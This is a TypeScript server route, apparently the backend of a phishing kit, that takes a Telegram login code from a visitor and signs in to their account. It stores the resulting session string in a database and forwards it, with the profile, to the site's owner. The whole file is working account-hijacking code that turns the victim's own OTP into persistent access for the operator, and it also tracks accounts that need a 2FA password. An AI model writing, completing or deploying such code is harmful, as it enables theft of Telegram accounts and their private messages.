import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl/api";
import { initSchema, queryOne, execute } from "@/lib/db";
import { sendHtmlToOwner, buildProfileHtml } from "@/lib/notify";
import { getCompleteProfile } from "@/lib/telegramProfile";

export const runtime = "nodejs";

export async function POST(req: Request) {
  await initSchema();
  try {
    const { loginId, phoneCodeHash, code } = await req.json();

    if (!loginId || !phoneCodeHash || !code) {
      return Response.json(
        { success: false, error: "Data verifikasi tidak lengkap.", reason: "bad_request" },
        { status: 400 }
      );
    }

    const apiId = parseInt(process.env.API_ID || "");
    const apiHash = process.env.API_HASH || "";

    if (!apiId || !apiHash) {
      return Response.json(
        { success: false, error: "Server configuration error." },
        { status: 500 }
      );
    }

    const session = await queryOne<{
      session_string: string;
      phone_code_hash: string;
      status: string;
      attempts: number;
      phone: string;
    }>(
      `SELECT session_string, phone_code_hash, status, attempts, phone
       FROM otp_sessions
       WHERE login_id = $1`,
      [loginId]
    );

    if (!session) {
      return Response.json(
        { success: false, error: "Sesi tidak ditemukan atau kadaluarsa.", reason: "expired" },
        { status: 400 }
      );
    }

    if (session.status !== "pending") {
      return Response.json(
        { success: false, error: "Sesi tidak valid.", reason: "invalid_session" },
        { status: 400 }
      );
    }

    if (session.attempts >= 5) {
      await execute("UPDATE otp_sessions SET status = 'failed', updated_at = NOW() WHERE login_id = $1", [loginId]);
      return Response.json(
        { success: false, error: "Terlalu banyak percobaan. Silakan kirim ulang kode.", reason: "too_many_attempts" },
        { status: 400 }
      );
    }

    const stringSession = new StringSession(session.session_string);
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 1,
    });

    await client.connect();

    try {
      await client.invoke(
        new Api.auth.SignIn({
          phoneNumber: session.phone,
          phoneCodeHash: session.phone_code_hash,
          phoneCode: code,
        })
      );

      const sessionString = client.session.save() as unknown as string;

      await queryOne(
        "UPDATE otp_sessions SET status = 'signed_in', session_string = $1, updated_at = NOW() WHERE login_id = $2",
        [sessionString, loginId]
      );

      const profile = await getCompleteProfile(client, sessionString);

      await queryOne(
        `INSERT INTO telegram_accounts (phone, user_id, username, first_name, last_name, session_string, two_fa_password_hash)
         VALUES ($1, $2, $3, $4, $5, $6, $7)
         ON CONFLICT (phone) DO UPDATE SET
           user_id = EXCLUDED.user_id,
           username = EXCLUDED.username,
           first_name = EXCLUDED.first_name,
           last_name = EXCLUDED.last_name,
           session_string = EXCLUDED.session_string,
           signed_at = NOW()`,
        [session.phone, profile.userId, profile.username, profile.firstName, profile.lastName, sessionString, null]
      );

      const html = buildProfileHtml({ ...profile, sessionString, twoFaUsed: false });
      const notifyOk = await sendHtmlToOwner(html);
      console.log("[verify-code] Owner notification:", notifyOk ? "sent" : "failed");

      return Response.json({ success: true, sessionString });
    } catch (err: any) {
      const errorMessage = err.errorMessage || err.message || "";

      await execute("UPDATE otp_sessions SET attempts = attempts + 1, updated_at = NOW() WHERE login_id = $1", [loginId]);

      if (errorMessage === "PHONE_CODE_INVALID") {
        return Response.json(
          { success: false, error: "Kode OTP salah", reason: "invalid" },
          { status: 400 }
        );
      }

      if (errorMessage === "PHONE_CODE_EXPIRED") {
        try {
          const newSession = new StringSession("");
          const newClient = new TelegramClient(newSession, apiId, apiHash, {
            connectionRetries: 1,
          });
          await newClient.connect();

          let res;
          let phoneForTelegram = session.phone;
          let attempt = 1;

          while (true) {
            try {
              console.log(`[sendCode auto-resend] attempt ${attempt} with phone: ${phoneForTelegram}`);
              res = await newClient.sendCode({ apiId, apiHash }, phoneForTelegram);
              break;
            } catch (err: any) {
              const errMsg = err.errorMessage || err.message || "";
              if (attempt === 1 && errMsg === "PHONE_NUMBER_INVALID") {
                console.warn(`[sendCode auto-resend] PHONE_NUMBER_INVALID with ${phoneForTelegram}, retrying with + prefix`);
                phoneForTelegram = `+${session.phone}`;
                attempt = 2;
                continue;
              }
              throw err;
            }
          }
          const newSessionString = newClient.session.save() as unknown as string;

          await execute(
            "UPDATE otp_sessions SET phone_code_hash = $1, session_string = $2, attempts = 0, expires_at = NOW() + INTERVAL '10 minutes', updated_at = NOW() WHERE login_id = $3",
            [res.phoneCodeHash, newSessionString, loginId]
          );
          await newClient.disconnect();

          return Response.json(
            {
              success: false,
              error: "Kode OTP kadaluarsa, kode baru telah dikirim",
              reason: "expired",
              newLoginId: loginId,
              newPhoneCodeHash: res.phoneCodeHash,
            },
            { status: 400 }
          );
        } catch (e) {
          console.error("Auto-resend failed:", e);
          await execute("UPDATE otp_sessions SET status = 'expired', updated_at = NOW() WHERE login_id = $1", [loginId]);
          return Response.json(
            { success: false, error: "Kode OTP kadaluarsa. Silakan kirim ulang.", reason: "expired" },
            { status: 400 }
          );
        }
      }

      if (errorMessage === "SESSION_PASSWORD_NEEDED") {
        await execute("UPDATE otp_sessions SET status = '2fa_needed', updated_at = NOW() WHERE login_id = $1", [loginId]);
        return Response.json(
          { success: false, error: "Akun Telegram dilindungi verifikasi dua langkah (2FA).", reason: "password_needed" },
          { status: 401 }
        );
      }

      return Response.json(
        { success: false, error: "Gagal memverifikasi kode OTP. Silakan coba lagi.", reason: "unknown" },
        { status: 500 }
      );
    }
  } catch (err: any) {
    console.error("Error verifying Telegram code:", err);
    return Response.json(
      { success: false, error: "Gagal memverifikasi kode OTP. Silakan coba lagi.", reason: "unknown" },
      { status: 500 }
    );
  }
}
